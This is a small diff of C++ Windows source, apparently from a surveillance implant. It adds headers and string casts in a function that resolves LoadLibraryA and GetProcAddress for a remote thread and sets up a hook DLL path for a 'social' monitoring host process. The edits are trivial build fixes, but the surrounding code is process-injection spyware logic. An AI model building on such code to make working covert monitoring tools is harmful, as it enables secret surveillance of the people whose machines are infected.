@@ -1,3 +1,15 @@
+#include <windows.h>
+#include <stdio.h>
+#include <string>
+#include <time.h>
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/H4-DLL.h"
+#include "../../H4DLL/LOG.h"
+#include <json/JSON.h>
+#include "../../H4DLL/bin_string.h"
+#include "../../H4DLL/AM_Core.h"
+#include "../../H4DLL/x64.h"
 
 // Globals
 BOOL social_is_host_started = FALSE; // Indica se il processo host del thread social e' stato gia' lanciato
@@ -62,9 +74,9 @@ DWORD SocialHost_Setup()
 	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"));
 
 	// API utilizzate dal thread remoto.... [KERNEL32.DLL]
-	VALIDPTR(SocialThreadData.pCommon._LoadLibrary = (LoadLibrary_T) HM_SafeGetProcAddress(hMod, "LoadLibraryA"));
-	VALIDPTR(SocialThreadData.pCommon._GetProcAddress = (GetProcAddress_T) HM_SafeGetProcAddress(hMod, "GetProcAddress"));
-	VALIDPTR(SocialThreadData.pExitProcess = (ExitProcess_T) HM_SafeGetProcAddress(hMod, "ExitProcess"));
+	VALIDPTR(SocialThreadData.pCommon._LoadLibrary = (LoadLibrary_T) HM_SafeGetProcAddress(hMod, (char*)"LoadLibraryA"));
+	VALIDPTR(SocialThreadData.pCommon._GetProcAddress = (GetProcAddress_T) HM_SafeGetProcAddress(hMod, (char*)"GetProcAddress"));
+	VALIDPTR(SocialThreadData.pExitProcess = (ExitProcess_T) HM_SafeGetProcAddress(hMod, (char *)"ExitProcess"));
 
 	HM_CompletePath(shared.H4DLLNAME, SocialThreadData.cDLLHookName);
 	_snprintf_s(SocialThreadData.cSocialMainLoop, sizeof(SocialThreadData.cSocialMainLoop), _TRUNCATE, "PPPFTBBP12");
